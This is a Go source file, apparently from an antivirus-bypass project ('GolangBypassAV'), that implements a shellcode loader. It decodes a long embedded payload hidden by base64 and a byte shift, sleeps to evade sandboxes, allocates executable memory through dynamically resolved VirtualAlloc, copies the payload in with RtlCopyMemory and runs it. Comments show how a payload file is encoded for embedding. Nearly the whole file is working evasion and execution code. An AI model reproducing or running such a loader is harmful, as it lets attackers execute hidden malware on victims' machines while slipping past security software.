package main

import (
	"GolangBypassAV/encry"
	"encoding/base64"
	"fmt"
	"os"
	"syscall"
	"time"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var kk = []byte{0x13, 0x32}

func base64Decode(data string) []byte {
	data1, _ := base64.StdEncoding.DecodeString(data)
	return data1
}

func base64Encode(data []byte) string {
	bdata := base64.StdEncoding.EncodeToString(data)
	return bdata
}

func getEnCode(data []byte) string {
	bdata := base64.StdEncoding.EncodeToString(data)

	bydata := []byte(bdata)
	var shellcode []byte

	for i := 0; i < len(bydata); i++ {
		shellcode = append(shellcode, bydata[i]+kk[0]-kk[1])
	}
	return base64.StdEncoding.EncodeToString(shellcode)
}

var (
	//kernel32 = syscall.MustLoadDLL("kernel32.dll")
	ntdll = syscall.MustLoadDLL("ntdll.dll")
	//VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	DllTestDef, _ = syscall.LoadLibrary("kernel32.dll")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func getDeCode(string2 string) []byte {

	ss, _ := base64.StdEncoding.DecodeString(string2)
	string2 = string(ss)
	var shellcode []byte

	bydata := []byte(string2)

	for i := 0; i < len(bydata); i++ {
		shellcode = append(shellcode, bydata[i]-kk[0]+kk[1])
	}
	ssb, _ := base64.StdEncoding.DecodeString(string(shellcode))
	return ssb

}

func checkError(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}

func genEXE(charcode []byte) {

	defer syscall.FreeLibrary(DllTestDef)
	add, err := syscall.GetProcAddress(DllTestDef, "VirtualAlloc")

	addr, _, err := syscall.Syscall(add, 0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)

	//addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	time.Sleep(5 * time.Second)
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func gd() int64 {
	time.Sleep(time.Duration(2) * time.Second)

	dd := time.Now().UTC().UnixNano()
	return dd + 123456

}

func getFileShellCode(file string) []byte {
	data := encry.ReadFile(file)
	//shellCodeHex := encry.GetBase64Data(data)
	//fmt.Print(shellCodeHex)
	return data
}

func getFileShellCode1(file string) string {
	data := encry.ReadFile(file)
	shellCodeHex := base64Encode(data)
	fmt.Print(shellCodeHex)
	return shellCodeHex
}

func main() {
	//fmt.Println(1)

	//fmt.Print(getEnCode(getFileShellCode("C:\\Users\\Administrator\\Desktop\\payload.bin")))

	bbdata := "ECZKJRYxJVBaIiIiIiYnMzI3IzQ2NzsqLkUrTTQqVTQ6JkotNklJKkoSKkg0KlVaNiZIMVURUSw1NSkrNCUpIlMlWUlHIipUKiYpI1oyEiMiRClKGDcrIzY2Si02SiQtMktZKiJFI05IOUg6JFgrEkRQViJKIiIiIiZKJ1gpM080IikyNipVKigmNC0yJCMrIkUlSzdMSxBaNigtLypJKiJFOy8uRE0qLkQkVDJEKSslNiYjWDVLSEVHJy4iEVhMJCY2FhE5OTo4JjQtMiQzKyJFI04yOlQuNCY0LTIjWSsiRSMjSlg0KjQiKTIyN0kjOCcWOzhMJzoyN00jOExKJRgkIyM2VxBIOCYnOzhMSi0mVk0xEBAQEDk4UCI0QxYUQjgWUUNONxEiJic4NDpPTjUqT1kyQ1EuRVo6KRAaNyouRE0qLkUrLy5EIy8uRE0jNiYnMjJDUBc3T05PEBo5U0QSUSpKRCcjViQiJSIiIy8uRE0jNjYnM0JILyM2NigXNxVOR1lXEDcXEk1DNCpPIzQlKTQ0Ok86NTUpKzZOSCIiTCQmNk0rI1ZWVTctS1cQEjZKK1lMSiVYEiNSJE0aKkpHJypKRVErWRklEBAQEBA1NSkrNk0rI1ZKESgoKVcQEjo5IiUVOEUiMiIiNDEQMSUVNC4iMiIiFxoxURYiJiIiMEpKEBAQEC0UTRcvWy4iTDs4N0UlRTYiQkoaUEI1KydRFiNVVhZQOiYvVjJDQxJJUC1IO1pOEElTSjYVRxdMLxlVTTlYW00XQlIoT0lYOjRYMFNTLy4WEDJWMUNINyc0T1sXGFYyFFlKNToZVFMrRiIjN0QTN1otNidPOzgWETBKIy9DFFFRQyhZSS1bNlYuJCJQOhMaVUQoJxFCOCtUOzVUSDU3LyszNCIWLUsiGCopJ0w7OS9TKiUqVi8kFVkuSzpbLUsqWC5bVEg3E01WOygaFERaIzA3JCITLUsmGConRTE3WzoRMFojNkROTUw7OBYRLVs2Vi4kTC8kSCI5OU8TVxIYQzckGC9GWi8sWy83E1kVOxpOU0tKTxhaWTQ0Tjk3E04qR0JKIltVUiM4U0UqLEQqUBoqMBoRT1g5TUtbMURLFUoaNiU6NjIjOzIaGBApOBBOKUtZVlkWOBY0FlgkNFESFCUyGDVYM05IQyZYFSMiWCkYFTNJMUhXTEITFVEMRlQwTiwnFU4aGkU3GRpVK0opSEpUJjkqKhMRFE5WW1YuM1gmOE1USygtMTBKLxURTjArRylLE0w0VyoXKhEaOFAXMjZHFCVGRBY3KDFZSykYThNXQyZENxdDEUdQU1AZJCxaRTRZKhg4QlUYKk01KDdZUUpGURZTK043LylTFUUVWyoiMkMYWFVCKzgQGjcqLkROFyIiIyIiJigVIiMiIiImKBYyIiIiIiYoFzgsMzUWRxA3NCsvNTYRSisWEUorGTZKKxNMKBUiJCIiIiZOKww2KBcmUUIrFVcQNzQqMSYqKjkiRS07TkpYRSoiRDAnWCk5OTgnSTo0IjYiIiIiIjYuMVBPEBQQEFsmWi5KFRYtSyYSL1oVWS5LKiImSzM4RiIeHg=="
	shellCodeHex := getDeCode(bbdata)
	gd()
	genEXE(shellCodeHex)
}
